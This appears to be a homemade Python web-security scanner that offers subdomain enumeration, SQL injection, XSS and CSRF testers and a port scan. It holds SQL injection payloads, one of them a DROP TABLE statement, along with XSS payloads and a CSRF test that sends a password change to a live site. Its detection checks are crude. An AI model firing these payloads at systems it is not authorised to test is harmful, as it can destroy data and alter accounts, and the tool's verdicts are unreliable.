import dns.resolver
import pyfiglet
import requests
import os
import re
import time
import socket
from bs4 import BeautifulSoup  # Ensure this is installed via pip
from colorama import Fore, Style, init
import dns.exception 


# Initialize colorama
init(autoreset=True)

# Function to create a static banner
def print_banner(text):
    banner = pyfiglet.figlet_format(text)
    print(Fore.CYAN + banner + Style.RESET_ALL)

# List of basic SQL injection payloads
sql_payloads = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "' OR 'a'='a",
    "' OR 1=1 --",
    "' OR ''='",
    "' OR '1'='1' #",
    "' OR 1=1",
    "' AND 1=1 --",
    "admin' --",
    "'; DROP TABLE users; --",
    "admin'/*"
]

# Basic XSS payloads
xss_payloads = [
    "<script>alert('XSS');</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "<body onload=alert('XSS')>",
]

# Function to validate domain
def validate_domain(domain):
    domain_regex = r'^(?:[a-zA-Z0-9]' + r'(?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?\.)' + r'+[a-zA-Z]{2,}$'
    if re.match(domain_regex, domain):
        return True
    else:
        print(Fore.RED + "[ERROR] Invalid domain format." + Style.RESET_ALL)
        return False

# Function to validate URL
def validate_url(url):
    url_regex = r'^(https?://)?([a-zA-Z0-9.-]+)(:[0-9]{1,5})?(/.*)?$'
    if re.match(url_regex, url):
        return True
    else:
        print(Fore.RED + "[ERROR] Invalid URL format." + Style.RESET_ALL)
        return False

# Function to check if file path exists
def validate_file_path(filepath):
    if os.path.exists(filepath) and os.path.isfile(filepath):
        return True
    else:
        print(Fore.RED + f"[ERROR] File not found: {filepath}" + Style.RESET_ALL)
        return False

# Function to check if a subdomain exists by resolving its DNS
def check_subdomain(domain, subdomain):
    try:
        full_domain = f"{subdomain}.{domain}"
        answers = dns.resolver.resolve(full_domain, 'A')  # A-record lookup
        return full_domain, answers
    except dns.resolver.NoNameservers:
        print(Fore.RED + f"[ERROR] No nameservers found for {full_domain}." + Style.RESET_ALL)
    except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer, dns.resolver.Timeout, dns.name.EmptyLabel) as e:
        print(Fore.RED + f"[ERROR] Failed to resolve {full_domain}: {e}" + Style.RESET_ALL)
    except dns.exception.DNSException as e:
        print(Fore.RED + f"[ERROR] DNS query failed for {full_domain}: {e}" + Style.RESET_ALL)
    return None


# Rate limiting: Pause between requests to avoid overwhelming target
def rate_limit(delay=1.0):
    time.sleep(delay)

# Function to enumerate subdomains with rate limiting
def enumerate_subdomains(domain, subdomain_list):
    valid_subdomains = []
    for subdomain in subdomain_list:
        if not subdomain.strip():
            continue

        result = check_subdomain(domain, subdomain.strip())
        if result:
            valid_subdomains.append(result[0])
            print(Fore.GREEN + f"[FOUND] {result[0]} - {result[1][0]}" + Style.RESET_ALL)
        else:
            print(Fore.RED + f"[NOT FOUND] {subdomain}.{domain}" + Style.RESET_ALL)
        
    return valid_subdomains

# Function to load subdomains from wordlist
def load_wordlist(filepath):
    with open(filepath, 'r') as f:
        return [line.strip() for line in f if line.strip()]

# Function to find broken links on a webpage
def find_broken_links(url):
    try:
        response = requests.get(url)
        soup = BeautifulSoup(response.text, 'html.parser')
        links = soup.find_all('a', href=True)
        broken_links = []

        for link in links:
            link_url = link['href']
            if not link_url.startswith('http'):
                link_url = os.path.join(url, link_url)

            try:
                link_response = requests.head(link_url, timeout=5)
                if link_response.status_code >= 400:
                    print(Fore.RED + f"[BROKEN] {link_url} - Status Code: {link_response.status_code}" + Style.RESET_ALL)
                    broken_links.append(link_url)
                else:
                    print(Fore.GREEN + f"[OK] {link_url}" + Style.RESET_ALL)
            except requests.RequestException:
                print(Fore.RED + f"[BROKEN] {link_url}" + Style.RESET_ALL)
                broken_links.append(link_url)

        return broken_links
    except requests.RequestException as e:
        print(Fore.RED + f"Error fetching the URL: {e}" + Style.RESET_ALL)
        return []

# Brute force protection: Limit retry attempts
MAX_RETRY_ATTEMPTS = 3

# Function to check for SQL injection vulnerabilities with brute force protection
def test_sql_injection(url, param):
    retry_attempts = 0
    for payload in sql_payloads:
        if retry_attempts >= MAX_RETRY_ATTEMPTS:
            print(Fore.YELLOW + "[WARNING] Max retry attempts reached for SQL Injection testing." + Style.RESET_ALL)
            break

        injected_url = url.replace(param, payload)
        print(Fore.CYAN + f"Testing payload: {payload}" + Style.RESET_ALL)

        try:
            response = requests.get(injected_url, timeout=5)
            if "mysql" in response.text.lower() or "syntax" in response.text.lower() or "error" in response.text.lower():
                print(Fore.RED + f"[VULNERABLE] SQL Injection found with payload: {payload}" + Style.RESET_ALL)
                return True
        except requests.RequestException as e:
            retry_attempts += 1
            print(Fore.RED + f"Error testing payload: {payload}, Error: {e}" + Style.RESET_ALL)

        rate_limit()  # Add delay between attempts to avoid brute force detection
    return False

# Function to check for XSS vulnerabilities
def test_xss(url):
    for payload in xss_payloads:
        injected_url = f"{url}?param={payload}"  # Example of adding payload to URL
        print(Fore.CYAN + f"Testing XSS payload: {payload}" + Style.RESET_ALL)

        try:
            response = requests.get(injected_url, timeout=5)
            if payload in response.text:
                print(Fore.RED + f"[VULNERABLE] XSS found with payload: {payload}" + Style.RESET_ALL)
                return True
        except requests.RequestException as e:
            print(Fore.RED + f"Error testing payload: {payload}, Error: {e}" + Style.RESET_ALL)

        rate_limit()
    return False

# Function to check for CSRF vulnerabilities
def test_csrf(url):
    print(Fore.CYAN + "Testing for CSRF vulnerabilities..." + Style.RESET_ALL)
    csrf_payload = {
        'action': 'change_password',  # Example action
        'username': 'attacker',  # Attacker's username
        'password': 'new_password'  # New password
    }

    try:
        response = requests.post(url, data=csrf_payload)
        if response.status_code == 200:
            print(Fore.RED + "[VULNERABLE] CSRF vulnerability detected." + Style.RESET_ALL)
            return True
        else:
            print(Fore.GREEN + "[SAFE] No CSRF vulnerability found." + Style.RESET_ALL)
    except requests.RequestException as e:
        print(Fore.RED + f"Error testing CSRF: {e}" + Style.RESET_ALL)
    
    return False

# Network vulnerability scanning (basic port scan using socket)
def network_vulnerability_scan(host, ports_to_scan):
    open_ports = []
    print(Fore.CYAN + f"Scanning {host} for open ports..." + Style.RESET_ALL)
    for port in ports_to_scan:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(1)  # Set timeout for the socket connection
            result = s.connect_ex((host, port))
            if result == 0:
                print(Fore.GREEN + f"[OPEN] Port {port} is open." + Style.RESET_ALL)
                open_ports.append(port)
            else:
                print(Fore.RED + f"[CLOSED] Port {port} is closed." + Style.RESET_ALL)
    return open_ports

import os

import os

# Function to generate a report with unique filename if the file already exists
def generate_report(results):
    try:
        # Set the path to the Downloads folder
        downloads_folder = os.path.expanduser('~/Downloads')
        
        # Ensure the Downloads folder path exists
        if not os.path.exists(downloads_folder):
            raise FileNotFoundError(f"Downloads folder not found at {downloads_folder}")

        # Define the base report file name
        base_report_file = os.path.join(downloads_folder, "security_report.txt")
        report_file = base_report_file
        
        # If the file already exists, generate a unique filename by appending a number
        counter = 1
        while os.path.exists(report_file):
            report_file = os.path.join(downloads_folder, f"security_report_{counter}.txt")
            counter += 1

        # Write the report to the file
        with open(report_file, 'w') as f:
            f.write("Security Assessment Report\n")
            f.write("=" * 50 + "\n")

            f.write("\nSubdomains Found:\n")
            for subdomain in results['subdomains']:
                f.write(f" - {subdomain}\n")

            f.write("\nBroken Links Found:\n")
            for link in results['broken_links']:
                f.write(f" - {link}\n")

            f.write("\nSQL Injection Vulnerabilities:\n")
            if 'url' in results['sql_injection']:
                f.write(f"URL Tested: {results['sql_injection']['url']}\n")
            else:
                f.write("URL Tested: Not Available\n")

            f.write("\nXSS Vulnerabilities Found:\n")
            f.write(f" - {results['xss_found']}\n")

            f.write("\nCSRF Vulnerabilities Found:\n")
            f.write(f" - {results['csrf_found']}\n")

            f.write("\nOpen Ports Detected:\n")
            for port in results.get('open_ports', []):
                f.write(f" - {port}\n")

        print(Fore.GREEN + f"\n[INFO] Report saved to {report_file}" + Style.RESET_ALL)

    except Exception as e:
        print(Fore.RED + f"Error saving report: {e}" + Style.RESET_ALL)

# Define the paths to the wordlists
BIG_WORDLIST_PATH = '/Users/ZoroAhmad/Desktop/Cyber_Security_Python_Package/Subdomain_Wordlist.txt'
SMALL_WORDLIST_PATH = '/Users/ZoroAhmad/Desktop/Cyber_Security_Python_Package/Small_Subdomain.txt'

# Main loop for user input and tool selection
def main():
    print_banner("Cyber Security Tool")
    
    results = {
        'subdomains': [],
        'broken_links': [],
        'sql_injection': {},
        'xss_found': False,
        'csrf_found': False,
        'open_ports': []
    }

    options = {
        "1": ("Subdomain Enumeration", enumerate_subdomains, "example.com"),
        "2": ("Broken Link Checker", find_broken_links, "https://example.com"),
        "3": ("SQL Injection Tester", test_sql_injection, "https://example.com/page?PARAM=value"),
        "4": ("XSS Tester", test_xss, "https://example.com/search?query=<script>alert('XSS')</script>"),
        "5": ("CSRF Tester", test_csrf, "https://example.com/update_profile"),
        "6": ("Network Vulnerability Scanner", network_vulnerability_scan, "192.168.1.1"),
    }

    while True:
        print(Fore.CYAN + "\nChoose a security tool:" + Style.RESET_ALL)
        print(Fore.YELLOW + "=" * 40 + Style.RESET_ALL)
        for num, (name, _, _) in options.items():
            print(Fore.YELLOW + f"[{num}] {name}" + Style.RESET_ALL)
        print(Fore.YELLOW + "=" * 40 + Style.RESET_ALL)
        print(Fore.CYAN + "Type 'exit' to quit and save the report." + Style.RESET_ALL)

        choice = input(Fore.CYAN + "Enter your choice: " + Style.RESET_ALL).strip()

        if choice.lower() == "exit":
            break

        if choice in options:
            option_name, tool_function, example_input = options[choice]
            print(Fore.CYAN + f"\nYou selected: {option_name}" + Style.RESET_ALL)
            print(Fore.YELLOW + "=" * 40 + Style.RESET_ALL)

            # Display the example after choice
            if example_input:
                print(Fore.CYAN + f"Example input: {example_input}" + Style.RESET_ALL)

            if option_name == "Subdomain Enumeration":
                domain = input("Enter the domain to enumerate subdomains for: ").strip()
                if validate_domain(domain):
                    # Prompt user for wordlist size
                    print(Fore.CYAN + "Choose the wordlist size:" + Style.RESET_ALL)
                    print(Fore.YELLOW + "[1] Big Wordlist" + Style.RESET_ALL)
                    print(Fore.YELLOW + "[2] Small Wordlist" + Style.RESET_ALL)

                    wordlist_choice = input(Fore.CYAN + "Enter your choice: " + Style.RESET_ALL).strip()
                    if wordlist_choice == '1':
                        wordlist_file = BIG_WORDLIST_PATH
                    elif wordlist_choice == '2':
                        wordlist_file = SMALL_WORDLIST_PATH
                    else:
                        print(Fore.RED + "[ERROR] Invalid choice. Using default small wordlist." + Style.RESET_ALL)
                        wordlist_file = SMALL_WORDLIST_PATH

                    if validate_file_path(wordlist_file):
                        subdomain_list = load_wordlist(wordlist_file)
                        results['subdomains'] = tool_function(domain, subdomain_list)

            elif option_name == "Broken Link Checker":
                target_url = input("Enter the URL to check for broken links: ").strip()
                if validate_url(target_url):
                    results['broken_links'] = tool_function(target_url)

            elif option_name == "SQL Injection Tester":
                target_url = input("Enter the URL to test for SQL Injection: ").strip()
                if validate_url(target_url):
                    param_to_inject = "PARAM"
                    results['sql_injection']['url'] = target_url
                    if tool_function(target_url, param_to_inject):
                        print(Fore.RED + f"SQL Injection vulnerabilities found at {target_url}" + Style.RESET_ALL)

            elif option_name == "XSS Tester":
                target_url = input("Enter the URL to test for XSS: ").strip()
                if validate_url(target_url):
                    results['xss_found'] = tool_function(target_url)
                    if results['xss_found']:
                        print(Fore.RED + "XSS vulnerabilities found." + Style.RESET_ALL)

            elif option_name == "CSRF Tester":
                target_url = input("Enter the URL to test for CSRF: ").strip()
                if validate_url(target_url):
                    results['csrf_found'] = tool_function(target_url)

            elif option_name == "Network Vulnerability Scanner":
                host = input("Enter the IP address or domain to scan for open ports: ").strip()
                ports_to_scan = [80, 443, 22, 21]  # Example list of ports to scan
                results['open_ports'] = tool_function(host, ports_to_scan)

        else:
            print(Fore.RED + "[ERROR] Invalid choice. Please select a valid option." + Style.RESET_ALL)

    # Generate the report at the end
    generate_report(results)

if __name__ == "__main__":
    main()
